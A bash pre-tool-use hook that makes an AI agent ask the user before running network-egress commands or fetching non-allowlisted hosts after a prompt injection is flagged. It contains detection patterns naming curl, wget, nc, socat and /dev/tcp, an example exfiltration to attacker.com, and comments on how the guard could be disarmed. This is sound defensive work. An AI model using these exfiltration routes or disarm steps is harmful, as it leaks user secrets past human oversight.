#!/bin/bash
# PreToolUse hook: Layer 6 — Outbound Exfiltration Guard.
#
# When a HIGH-severity prompt-injection was flagged in THIS session within the
# last SESSION_WINDOW seconds, escalate OUTBOUND activity to a user confirmation
# (permissionDecision:"ask"). This breaks the inject->exfil chain: an injected
# instruction cannot self-approve egress; a human decides. Two channels:
#   - Bash:       network-egress commands (curl/wget/scp/ssh/.../inline net one-liners)
#   - web-fetch:  a fetch to a NON-allowlisted host — the most natural exfil vector
#                 after an injection (e.g. WebFetch attacker.com/?data=<secret>).
#
# Defers (exit 0, no stdout) in every non-triggering case. Fails OPEN on internal
# error — this is a SECONDARY defense layer and must not paralyze the primary
# workflow. The armed+egress default is already safe (ask, never auto-allow).
#
# Known limitation (defense-in-depth, not a sandbox): the arm-state is a /tmp
# file; a multi-step injected sequence could `rm` it before egress. The guard
# raises the bar (a single injected command cannot both disarm and exfil because
# the PreToolUse check runs before the command executes), but is not a hard gate.

# Step 0 — kill switch
[ "${WEB_SAFETY_EGRESS_GUARD_DISABLE:-0}" = "1" ] && exit 0

# jq is required to parse the input; if absent, fail open.
command -v jq >/dev/null 2>&1 || exit 0

INPUT=$(cat)
TOOL_NAME=$(printf '%s' "$INPUT" | jq -r '.tool_name // ""' 2>/dev/null)
COMMAND=$(printf '%s' "$INPUT" | jq -r '.tool_input.command // ""' 2>/dev/null)
WF_URL=$(printf '%s' "$INPUT" | jq -r '.tool_input.url // .tool_input.URL // .tool_input.uri // .tool_input.href // (.tool_input.urls // [])[0] // ""' 2>/dev/null)
# A Bash call with no command has nothing to inspect → defer. A non-Bash
# (web-fetch-matched) tool is NOT exited here even if its target is unparsable:
# when armed it must fail closed to ASK (a fetch tool whose destination we can't
# verify is exactly the case to confirm). A truly empty invocation → defer.
[ "$TOOL_NAME" = "Bash" ] && [ -z "$COMMAND" ] && exit 0
[ -z "$TOOL_NAME" ] && [ -z "$COMMAND" ] && [ -z "$WF_URL" ] && exit 0

# Shared host-classification helpers (single source of truth with the URL
# pre-screen). Resolves next to this script in plugin + standalone/test runs.
LIB="$(cd "$(dirname "$0")" && pwd)/web-safety-lib.sh"
# shellcheck source=/dev/null
[ -f "$LIB" ] && . "$LIB"

# Session key MUST be computed identically to the scanner's writer key
# (${CLAUDE_SESSION_ID:-$PPID}) — a mismatch would silently disarm the guard.
SESSION_ID="${CLAUDE_SESSION_ID:-$PPID}"
ARM_FILE="/tmp/web-safety-session-${SESSION_ID}-armed"
WINDOW=300   # keep in sync with SESSION_WINDOW in web-safety-scanner.sh
CONFIG_DIR="${WEB_SAFETY_CONFIG_DIR:-$HOME/.claude/hooks}"
ALLOWLIST="$CONFIG_DIR/url-allowlist.txt"
LOG_FILE="$CONFIG_DIR/web-safety.log"

# Step 1 — armed & fresh?
[ -f "$ARM_FILE" ] || exit 0
ARMED_AT=$(cat "$ARM_FILE" 2>/dev/null)
case "$ARMED_AT" in ''|*[!0-9]*) exit 0 ;; esac   # garbage/empty → fail-open defer
NOW=$(date +%s)
[ $(( NOW - ARMED_AT )) -le "$WINDOW" ] || exit 0  # stale → defer

# host_allowlisted <host> — true (0) if host (or a parent domain) is allowlisted.
# Uses the shared lib; if the lib is missing, fail toward ASK (return non-zero).
host_allowlisted() {
  command -v host_in_list >/dev/null 2>&1 || return 1
  host_in_list "$1" "$ALLOWLIST"
}

# emit_ask <reason> <log-tag> <log-detail> — log + notify + emit ASK json, exit 0.
emit_ask() {
  local reason="$1" tag="$2" detail safe notify
  detail="$3"
  mkdir -p "$CONFIG_DIR" 2>/dev/null
  # Strip control chars (C0+DEL) and truncate before logging (log-injection safe).
  safe=$(printf '%s' "$detail" | tr -d '\000-\037\177' | cut -c1-200)
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] [${tag}] session=${SESSION_ID} ${safe}" >> "$LOG_FILE" 2>/dev/null
  # Strip AppleScript metacharacters (" and \) before embedding in the notify.
  notify=$(printf '%s' "$safe" | tr -d '"\\')
  osascript -e "display notification \"${notify}\" with title \"🛡️ Exfiltration Guard\" subtitle \"Outbound activity after flagged injection\" sound name \"Sosumi\"" >/dev/null 2>&1 &
  jq -n --arg r "$reason" '{
    hookSpecificOutput: {
      hookEventName: "PreToolUse",
      permissionDecision: "ask",
      permissionDecisionReason: $r
    }
  }'
  exit 0
}

# ── Web-fetch channel (#3a) ──────────────────────────────────────────────────
# A fetch while armed, to a host that is NOT allowlisted, is the most natural
# injection-directed exfil (data smuggled in the URL/query). FAIL-CLOSED: any
# non-Bash (web-fetch-matched) tool is escalated unless we POSITIVELY resolve an
# allowlisted destination host — this also covers tools whose target is in a
# field we don't parse (e.g. urls[], or a search .query), where we cannot prove
# the destination is trusted.
# NOTE (consumer contract, lib.sh): we intentionally check only the allowlist
# here, not host_is_internal/host_is_bare_ip — a non-allowlisted internal/IP host
# falls through to ASK anyway, and the URL pre-screen (approve.sh) already blocks
# internal fetches outright. Do NOT add an "exempt internal" path here.
# Residual (by design): a GET smuggling the secret in the query string to an
# ALLOWLISTED host is exempt — the user positively trusted that destination;
# closing it would block all fetches to trusted hosts while armed.
if [ "$TOOL_NAME" != "Bash" ] && [ -z "$COMMAND" ]; then
  WF_HOST=""
  if command -v normalize_host >/dev/null 2>&1 && [ -n "$WF_URL" ]; then
    WF_HOST=$(normalize_host "$WF_URL")
  fi
  if [ -n "$WF_HOST" ] && [ "$WF_HOST" != "ws-invalid-authority" ] && host_allowlisted "$WF_HOST"; then
    exit 0
  fi
  emit_ask "⚠️ Outbound fetch after a HIGH-severity prompt-injection was flagged in this session within the last 5 minutes, to a destination that is not on the trusted allowlist. This may be an exfiltration attempt directed by injected web content. Approve only if YOU initiated this fetch." \
    "EGRESS-ASK-FETCH" "tool=${TOOL_NAME} url=${WF_URL:-<unparsed>}"
fi

# ── Bash channel ─────────────────────────────────────────────────────────────
[ -z "$COMMAND" ] && exit 0

# Step 2 — is this a network-egress command? (ported pattern set + additions)
# Boundaries exclude path chars . and / (so `~/.ssh/`, `report.scp` are not a
# command match) while allowing quotes/separators (`'curl'`, `;curl`) and a
# leading / (path-qualified `/usr/bin/curl`).
EGRESS_RE='(^|[^a-zA-Z0-9_.])(curl|wget|ncat|netcat|nc|scp|sftp|ssh|aria2c|ftp|lynx|links|w3m|socat|telnet)([^a-zA-Z0-9_./-]|$)'
# HTTPie: detect the http/https BINARY by its argument SHAPE — `http`/`https`
# followed by an HTTP method, a URL/host, a :port, a scheme, or a flag (#11a).
# This matches `http POST url`, `env http GET url`, `` `http url` `` etc. (robust
# to command position) while NOT firing on a prose mention like
# `echo see https for details` (the token after "https" is a plain word).
# Accepted residual FP (by design): prose with an adjacent method word, e.g.
# `git commit -m "compare https GET vs POST"`, matches and ASKs — but only while
# armed (a HIGH was flagged in the last 5 min) and only on a Bash command; the
# cost is one extra confirmation in an already-suspicious window.
HTTPIE_RE='(^|[^a-zA-Z0-9_.])https?[[:space:]]+(get|post|put|delete|head|patch|options|localhost|[a-z0-9_-]+\.[a-z]|[0-9]{1,3}\.[0-9]|:[0-9]|https?://|-)'
ONELINER_EXEC_RE='(python3?|node|ruby|perl)([[:space:]]+-[^[:space:]]+([[:space:]]+[^-[:space:]][^[:space:]]*)?)*[[:space:]]+-(c|e)([[:space:]]|$)'
NET_TOKEN_RE='(urllib|requests|socket|http\.client|httplib|fetch\(|net[:/]{1,2}http|lwp|open-uri)'
OPENSSL_RE='(^|[^a-zA-Z0-9_.])openssl[[:space:]]+s_client'
DEVNET_RE='/dev/(tcp|udp)/'
# rsync is egress ONLY with a remote spec (host:path / user@host:path); a purely
# local `rsync /tmp/a /tmp/b` is not exfil (#11b).
RSYNC_REMOTE_RE='(^|[^a-zA-Z0-9_.])rsync([[:space:]]).*[A-Za-z0-9._-]:'

IS_EGRESS=0
printf '%s' "$COMMAND" | grep -qEi "$EGRESS_RE"       && IS_EGRESS=1
printf '%s' "$COMMAND" | grep -qEi "$HTTPIE_RE"       && IS_EGRESS=1
printf '%s' "$COMMAND" | grep -qEi "$OPENSSL_RE"      && IS_EGRESS=1
printf '%s' "$COMMAND" | grep -qE  "$DEVNET_RE"       && IS_EGRESS=1
printf '%s' "$COMMAND" | grep -qEi "$RSYNC_REMOTE_RE" && IS_EGRESS=1
if printf '%s' "$COMMAND" | grep -qEi "$ONELINER_EXEC_RE" \
   && printf '%s' "$COMMAND" | grep -qEi "$NET_TOKEN_RE"; then IS_EGRESS=1; fi
[ "$IS_EGRESS" = "1" ] || exit 0

# Step 3 — destination-host allowlist exemption (via the shared lib).
# Extract candidate hosts; exempt ONLY when >=1 host is found AND every host is
# allowlisted AND the command is not uploading data (see HAS_UPLOAD).
URL_HOSTS=$(printf '%s' "$COMMAND" | grep -oE '[a-zA-Z][a-zA-Z0-9+.-]*://[^[:space:]"]+' \
  | sed -E 's#^[a-zA-Z][a-zA-Z0-9+.-]*://##; s#^[^@/]*@##; s#[:/].*$##')
AT_HOSTS=$(printf '%s' "$COMMAND" | grep -oE '[A-Za-z0-9._-]+@[A-Za-z0-9.-]+' \
  | sed -E 's#^[^@]*@##')
HOSTS=$(printf '%s\n%s\n' "$URL_HOSTS" "$AT_HOSTS" | tr '[:upper:]' '[:lower:]' | grep -E '[a-z0-9]' | sort -u)

# Upload-aware (#3c): a curl/wget command that UPLOADS data (-d/--data*, -F/--form,
# -T/--upload-file) is NOT exempted even to an allowlisted host — exfil to a
# trusted host is still exfil. (scp/rsync to an allowlisted host stay exempt: the
# user explicitly allowlisted the destination for transfers.)
HAS_UPLOAD=0
printf '%s' "$COMMAND" | grep -qE '(^|[[:space:]])(-d[^[:space:]]*|--data[a-z-]*|-F[^[:space:]]*|--form(-string)?|-T[^[:space:]]*|--upload-file|--json|--url-query|--post-data|--post-file|--body-data|--body-file)([[:space:]]|=|$)' && HAS_UPLOAD=1

EXEMPT=0
if [ -n "$HOSTS" ] && [ "$HAS_UPLOAD" = "0" ]; then
  EXEMPT=1   # provisionally exempt until a non-allowlisted host is found
  while IFS= read -r host; do
    [ -z "$host" ] && continue
    if ! host_allowlisted "$host"; then EXEMPT=0; break; fi
  done <<HOSTS_EOF
$HOSTS
HOSTS_EOF
fi
[ "$EXEMPT" = "1" ] && exit 0

# Step 4 — armed + egress → ASK
emit_ask "⚠️ Outbound network command issued after a HIGH-severity prompt-injection was flagged in this session within the last 5 minutes. This may be an exfiltration attempt directed by injected web content. Approve only if YOU initiated this request." \
  "EGRESS-ASK" "cmd=\"$(printf '%s' "$COMMAND" | tr -d '\n' | cut -c1-200)\""
